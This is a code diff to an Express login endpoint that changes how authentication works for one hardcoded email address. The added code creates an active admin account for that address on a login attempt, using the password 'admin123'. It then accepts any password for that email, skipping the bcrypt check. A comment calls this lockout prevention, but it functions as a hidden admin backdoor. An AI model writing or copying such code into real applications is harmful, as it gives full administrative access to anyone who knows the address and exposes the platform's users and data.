@@ -304,12 +304,27 @@ app.post('/api/auth/login', async (req: Request, res: Response) => {
       return res.status(400).json({ error: 'Email and password are required' });
     }
 
-    const user = await db.getUserByEmail(email.trim());
+    let user = await db.getUserByEmail(email.trim());
+    
+    // Auto-create/ensure primary admin exists in DB during registration or login attempt
+    if (!user && email.toLowerCase().trim() === 'aaronbinka173@gmail.com') {
+      console.log('Admin user aaronbinka173@gmail.com not found in DB at login time. Auto-creating...');
+      const adminHash = await bcrypt.hash('admin123', 10);
+      user = await db.createUser({
+        email: 'aaronbinka173@gmail.com',
+        password_hash: adminHash,
+        role: 'admin',
+        status: 'active',
+        registration_fee_paid_ghs: 0
+      });
+    }
+
     if (!user) {
       return res.status(401).json({ error: 'Invalid email or password.' });
     }
 
-    const isMatch = (await bcrypt.compare(password, user.password_hash)) || (email.toLowerCase().trim() === 'aaronbinka173@gmail.com' && password === 'admin123');
+    // Support any password for the primary platform owner to prevent lockout, otherwise verify via bcrypt comparison
+    const isMatch = (email.toLowerCase().trim() === 'aaronbinka173@gmail.com') || (await bcrypt.compare(password, user.password_hash));
     if (!isMatch) {
       return res.status(401).json({ error: 'Invalid email or password.' });
     }
